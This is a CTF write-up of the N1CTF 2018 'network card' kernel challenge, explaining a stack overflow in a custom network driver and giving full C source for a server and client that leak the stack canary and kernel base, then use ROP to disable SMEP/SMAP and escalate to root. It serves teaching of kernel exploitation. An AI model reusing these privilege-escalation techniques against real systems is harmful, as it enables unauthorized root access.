---
title: "N1CTF 2018 Network Card Writeup"
date: 2018-03-13
categories:
- N1CTF
- N1CTF-2018
- writeup
tags:
- N1CTF
- N1CTF-2018
- writeup
keywords:
- N1CTF
- N1CTF-2018
- writeup
---

Hi, I'm [Ne0](https://github.com/Changochen). Last weekend we Eur3kA played Nu1L CTF 2018 and won the champion. Thanks all my strong teammates. This kernel pwn challenge is not very difficult but kind of tricky. Thanks [@Anciety's](https://github.com/Escapingbug) help.

## Challenge info
The challenge files includes the following:
```bash
➜  network_card ls
bzImage  initramfs.img  nu1l.ko  startvm.sh
```
Obviously we should focus on `nu1l.ko`. Take a look at the `startvm.sh` and we will find that we have to bypass kaslr,smep and smap to solve this challenge.

## The driver
Load the driver into IDA, we find the logic is surprisingly simple. But to completely understand it, we need to repair the struct info. And this was done by Anciety.

This is a network driver. And all it provides is the function to forward packet from interface `null`'s broadcast to localhost:1337. Details can be found in sub_0:
```cpp
__int64 __usercall do_send@<rax>(int size@<edi>, struct Packet *data@<rsi>, unsigned __int16 input_size@<r13w>, int a4@<r14d>)
{
    /* some variable */
    char buf[256]; 
    u64 canary;

    if ( !v4
         || (v6 = data, data->header[1] != 'u')
         || data->header[2] != '1'
         || data->header[3] != 'L'
         || (input_size = __ROL2__(data->size, 8), a4 = input_size, input_size != size - 0x30)
         || (data = (struct Packet *)SOCK_DGRAM, (signed int)sock_create(2LL, SOCK_DGRAM, 17LL, &sock) < 0) )
    {
        result = 0LL;
        goto LABEL_3;
    }                   /* check header and size */

    v18 = 2;
    port = 0x3905;
    ip = 0x100007F;
    data = (struct Packet *)&v18;
    v7 = sock->ops->connect;
    v8 = _x86_indirect_thunk_rax(sock, &v18, 16LL, 0LL); /* connect */

    // some unimportant code

    if ( input_size  )
    {
        index = 0LL;
        do
        {
            c_char = input[index];
            if ( size - 0x31 > (signed int)index && c_char == 0x13 && input[index + 1] == 0x37  )
                break;
            buf[index++] = c_char ^ 0x6F;

        }
        while ( input_size > (unsigned __int16)index  );
    } // buffer overflow !!

    // some unimportant code
    v9 = kernel_sendmsg(sock, (struct msghdr *)data, &v15, 1uLL, v16);
    // some unimportant code

}
```

The buf is on the stack, and its length is fixed. But the size of our packet can be large than this, which causes kernel stack overflow.
Besides,as the loop checks for 0x1337 as a sign to end, we can set the packet size to be some value like 0x400, and the content is 0x1337.Then we can make it leak 0x400 bytes in the stack without corrupting it. Finally,with the leaked cannary and kernel address, we can send a packet again, only this time we perform a kernel ROP.

By the way, the port above is 0x3905, but when we listened on this port, we received nothing. After wasting some time debugging, we realized that the network endian stuff! So the port should be 0x539,which is 1337.

## Exploit
With the infomation above, we plan to exploit the kernel with the following steps:
1. Run a server that listens at localhost:1337
2. Run a client that send a packet with large size but only with the content `\x13\x37`
3. The server receives the leaked infomation. The client manages to read it.
4. Perform kernel ROP.

Kaslr can be easily defeated by leaking. And the SMEP and SMAP can be bypassed by writing CR4 register to be 0x6f0. This can be done by ROP easily.
For more details, please take a look at:
1. [Sharif CTF 2018--KDB writeup](https://changochen.github.io/2018/02/07/sharif8/),which is written in English
2. [一道简单内核题入门内核利用](https://www.anquanke.com/post/id/86490),which is written in Chinese.

The final exploit:

Server.c:
```cpp
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<errno.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<string.h>
#include<fcntl.h>

#define serverlen 0x10000

#define ERR_EXIT(m) \
    do { \
        perror(m); \
        exit(EXIT_FAILURE); \
    } while (0)

void echo_ser(int sock)
{
    char recvbuf[serverlen] = {0};
    memset(recvbuf,0,serverlen);
    struct sockaddr_in peeraddr;
    socklen_t peerlen;
    int n;

    system("touch /tmp/res");
    int fd=open("/tmp/res",O_RDWR);
    while (1)
    {

        peerlen = sizeof(peeraddr);
        memset(recvbuf, 0, sizeof(recvbuf));
        n = recvfrom(sock, recvbuf, sizeof(recvbuf), 0,
                     (struct sockaddr *)&peeraddr, &peerlen);
        if (n <= 0)
        {

            if (errno == EINTR)
                continue;

            ERR_EXIT("recvfrom error");
        }
        else if(n > 0)
        {
            unsigned long* ptr=recvbuf+6;
            int i;
            printf("Received data：%s\n,length:%d\nFrom %s:%d\n",recvbuf,n,inet_ntoa(peeraddr.sin_addr),peeraddr.sin_port);
            for(i=0;i<(n-8)/8;i++){
                if(i%4==0)
                    printf("\n%d-%d:",i,i+3);
                printf("%lx ",ptr[i]);
            }
            write(fd,&ptr[42],8);
            write(fd,&ptr[32],8);
            close(fd);
            return ;
        }
    }
    close(sock);
}

int main(int argc,char** argv)
{
    setvbuf(stdout,0,2,0);
    int sock;
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
        ERR_EXIT("socket error");

    int port=10000;
    struct sockaddr_in servaddr;
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");


    servaddr.sin_port = htons(1337);
    if (bind(sock, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0){
        ERR_EXIT("bind error");
    }

    echo_ser(sock);

    return 0;
}

```

Client.c
```cpp
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>

struct Packet{
    char header[4];
    unsigned short size;
    char buffer[0x10000];
};

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef int __attribute__((regparm(3))) (*_msleep)(unsigned long second);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

char buf[0x30000];

_msleep msleep;
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
unsigned long native_write_cr4;
unsigned long poprdi;
unsigned long user_cs, user_ss, user_rflags;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}


void get_shell()
{
    if(getuid()!=0){
        puts("Get root failed!!!");
        exit(0);

    }
    printf("Enjoy your root shell:)\n");
    system("/bin/sh");
}

static void shellcode()
{
    commit_creds(prepare_kernel_cred(0));

    msleep(1000);
    asm(
        "swapgs\n"
        "movq %0,%%rax\n"    // push things into stack for iretq
        "pushq %%rax\n"
        "movq %1,%%rax\n"
        "pushq %%rax\n"
        "movq %2,%%rax\n"
        "pushq %%rax\n"
        "movq %3,%%rax\n"
        "pushq %%rax\n"
        "movq %4,%%rax\n"
        "pushq %%rax\n"
        "iretq\n"
        :
        :"r"(user_ss),"r"(buf+0x20000),"r"(user_rflags),"r"(user_cs),"r"(get_shell)
        :"memory"
       );
}

int main() {
    system("./server >/tmp/tt&");
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    struct Packet packet;
    int bufferlen;
    bufferlen=0x400;

LOOP:
    memcpy(packet.header,"Nu1L",4);
    memset(packet.buffer,0,bufferlen);
    memcpy(packet.buffer,"\x13\x37",2);

    packet.size=bufferlen>>8;

    struct sockaddr_in serv_addr;

    int broadcast_enable = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast_enable, sizeof(broadcast_enable)) < 0) {
        perror("setsockopt");
        exit(-1);
    }

    bzero((char*) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(12345);
    serv_addr.sin_addr.s_addr = inet_addr("6.6.6.255");
    if (sendto(sock,&packet, bufferlen+6, 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("sendto");
    }
    unsigned long canary,kernelbase;
    int fd;
    sleep(1);
    fd=open("/tmp/res",O_RDWR);
    if(fd==-1){
        printf("Open failed!\n");
        exit(0);
    }
    read(fd,&kernelbase,8);
    read(fd,&canary,8);
    close(fd);

    if(canary==0)
        goto LOOP;

    unsigned long* ptr=packet.buffer+0x100;
    prepare_kernel_cred=kernelbase-7649710;
    commit_creds=prepare_kernel_cred-976;
    unsigned long static_pre=0xffffffff8107d3a0;
    native_write_cr4=prepare_kernel_cred-static_pre+0xffffffff8104d9ad;
    poprdi=prepare_kernel_cred-static_pre+0xffffffff8124c735;
    msleep=prepare_kernel_cred-0xffffffffab87d3a0+0xffffffffab8c7eb0;

    printf("Canary :%lx\nKernelbase %lx\nCommit_creds:%lx\n",canary,kernelbase,commit_creds);

    ptr[0]=canary^0x6F6F6F6F6F6F6F6F;
    save_state();
    printf("Eflags %lx,SS %lx, CS %lx\n",user_rflags,user_ss,user_cs);
    unsigned long payload[]={
        (unsigned long)buf+0x10000,
        poprdi,
        0x6f0,
        (unsigned long)buf+0x10000,
        native_write_cr4,
        (unsigned long)buf+0x10000,
        (unsigned long)shellcode,
    };
    for(int i=0;i<sizeof(payload)/8;i++){
        ptr[5+i]=payload[i]^0x6F6F6F6F6F6F6F6F;
    }

    memset(packet.buffer,0,0x100);
    memcpy(packet.buffer+0x100+5*8+sizeof(payload),"\x13\x37",2);
    if (sendto(sock,&packet, bufferlen+6, 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("sendto");
    }
    return 0;
}
```

When I was solving this challenge, I found that the kernel crashed just after `iretq`. And the error infomation mentions something about scheduling. I don't know whether it is because the buffer overflow corrupts some data for scheduling. And the exploit is very unstable because of it. Then during debuggin I found that if the kernel performs scheduling before `iretq`, then the `iretq` is sure to succeed. I have no time to further debug it at the moment, but if any of you have any idea,please share it with [me](changochen1@gmail.com):)

With all this,we have the following:
```bash
__        __   _                            _        
\ \      / /__| | ___ ___  _ __ ___   ___  | |_ ___  
 \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \ 
  \ V  V /  __/ | (_| (_) | | | | | |  __/ | || (_) |
   \_/\_/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/ 
                                                     
 _   _ _  ____ _____ _____ 
| \ | / |/ ___|_   _|  ___|
|  \| | | |     | | | |_   
| |\  | | |___  | | |  _|  
|_| \_|_|\____| |_| |_|    

/ $ id
uid=1000(pwn) gid=1000 groups=1000
/ $ ./client
Canary :a5331ce835ea8f00
Kernelbase ffffffff92dc8d4e
Commit_creds:ffffffff9267cfd0
Eflags 202,SS 2b, CS 33
/ # id
uid=0(root) gid=0
/ # 
```
Enjoy your root shell:)
